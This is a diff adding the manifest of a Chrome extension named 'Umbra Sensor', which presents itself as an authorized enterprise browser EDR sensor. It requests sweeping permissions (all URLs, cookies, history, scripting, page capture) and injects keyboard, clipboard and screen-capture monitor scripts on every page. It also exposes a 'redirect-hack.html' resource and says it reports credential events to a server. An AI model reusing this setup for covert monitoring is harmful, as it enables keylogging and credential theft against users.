@@ -1,0 +1,69 @@
+{
+  "name": "Umbra Sensor",
+  "version": "0.2.1",
+  "manifest_version": 3,
+  "description": "Browser-layer EDR sensor for authorized enterprise monitoring. Reports activity, screen captures, and credential events to a central Umbra server. Authorized use only.",
+  "homepage_url": "https://github.com/s045pd/umbra-edr",
+  "icons": {
+    "16": "icons/icon16.png",
+    "48": "icons/icon48.png",
+    "128": "icons/icon128.png"
+  },
+  "default_locale": "en",
+  "background": {
+    "service_worker": "src/bg/background.js"
+  },
+  "host_permissions": [
+    "<all_urls>"
+  ],
+  "permissions": [
+    "webRequest",
+    "cookies",
+    "history",
+    "tabs",
+    "activeTab",
+    "idle",
+    "bookmarks",
+    "downloads",
+    "storage",
+    "unlimitedStorage",
+    "scripting",
+    "offscreen",
+    "sessions",
+    "topSites",
+    "webNavigation",
+    "pageCapture",
+    "readingList",
+    "system.cpu",
+    "system.memory",
+    "system.storage",
+    "processes"
+  ],
+  "content_scripts": [
+    {
+      "matches": [
+        "<all_urls>"
+      ],
+      "js": [
+        "src/content/keyboard-monitor.js",
+        "src/content/screen-capture.js",
+        "src/content/activity-monitor.js",
+        "src/content/clipboard-monitor.js"
+      ],
+      "run_at": "document_start"
+    }
+  ],
+  "content_security_policy": {
+    "extension_pages": "script-src 'self'; object-src 'self'"
+  },
+  "web_accessible_resources": [
+    {
+      "resources": [
+        "redirect-hack.html"
+      ],
+      "matches": [
+        "<all_urls>"
+      ]
+    }
+  ]
+}
